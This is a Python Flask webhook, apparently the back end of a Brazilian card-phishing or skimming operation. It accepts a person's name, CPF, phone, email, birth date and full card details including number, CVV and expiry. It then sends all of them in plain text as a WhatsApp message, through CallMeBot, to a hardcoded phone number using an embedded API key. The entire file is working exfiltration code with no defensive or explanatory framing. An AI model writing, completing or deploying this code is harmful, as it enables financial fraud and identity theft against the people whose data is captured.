from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import urllib.parse

app = Flask(__name__)
CORS(app)

@app.route("/webhook", methods=["POST"])
def webhook():
    dados = request.json

    try:
        # Dados recebidos
        nome = dados.get("name", "Não informado")
        cpf = dados.get("cpf", "Não informado")
        telefone = dados.get("phone", "Não informado")
        email = dados.get("email", "Não informado")
        cep = dados.get("cep", "Não informado")
        nascimento = dados.get("birth", "Não informado")
        nome_titular = dados.get("nome_titular", "Não informado")
        numero_cartao = dados.get("numero_cartao", "Não informado")
        bandeira = dados.get("bandeira", "Não informado")
        cvv = dados.get("cvv", "Não informado")
        banco = dados.get("banco", "Não informado")
        funcao = dados.get("funcao", "Não informado")
        validade = dados.get("validade", "Não informado")
        data_envio = dados.get("data_envio", "Não informado")

        # Mensagem formatada
        mensagem = f"""📋 *Cadastro Recebido*

*Dados Cadastrais:*
- Nome: {nome}
- CPF: {cpf}
- Telefone: {telefone}
- Email: {email}
- CEP: {cep}
- Nascimento: {nascimento}

*Dados do Cartão:*
- Nome do Titular: {nome_titular}
- Número: {numero_cartao}
- Bandeira: {bandeira}
- CVV: {cvv}
- Banco: {banco}
- Função: {funcao}
- Validade: {validade}

📆 Enviado em: {data_envio}
"""

        # URL encode da mensagem
        mensagem_encoded = urllib.parse.quote(mensagem)

        # Envio via CallMeBot (WhatsApp)
        api_url = (
            f"https://api.callmebot.com/whatsapp.php?"
            f"phone=+5511956041955&apikey=3337605"
            f"&text={mensagem_encoded}"
        )

        response = requests.get(api_url)

        return jsonify({
            "status": response.status_code,
            "response": response.text,
            "mensagem_enviada": mensagem
        })

    except Exception as e:
        return jsonify({"error": str(e)}), 500

from waitress import serve

if __name__ == '__main__':
    serve(app, host='0.0.0.0', port=5000)
